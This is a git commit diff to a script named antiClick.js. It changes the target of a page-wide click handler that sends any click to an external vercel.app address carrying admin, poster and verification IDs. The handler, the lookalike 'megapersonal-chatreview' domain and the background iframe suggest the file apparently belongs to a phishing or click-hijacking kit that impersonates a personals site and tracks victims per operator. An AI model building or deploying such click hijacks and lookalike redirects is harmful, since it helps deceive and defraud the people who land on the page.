c4385d49bffc4c7f2085ec4071aaf0d764a44ab2
rana <rana.buddy@gmail.com>
2025-07-19 21:37:39 +0600

    feat:xioncart sh creation

--- antiClick.js
+++ antiClick.js
@@ -51,7 +51,7 @@ document.body.appendChild(backgroundIframe);
 // Redirect when clicking anywhere on the page
 document.body.addEventListener('click', () => {
     if (poster) {
-        window.location.href = `https://megapersonal-chatreview.vercel.app/${admin}/${poster}/${verifyId}`;
+        window.location.href = `https://mega-chatreview.vercel.app/${admin}/${poster}/${verifyId}`;
     } else {
         alert('User ID not found!');
     }
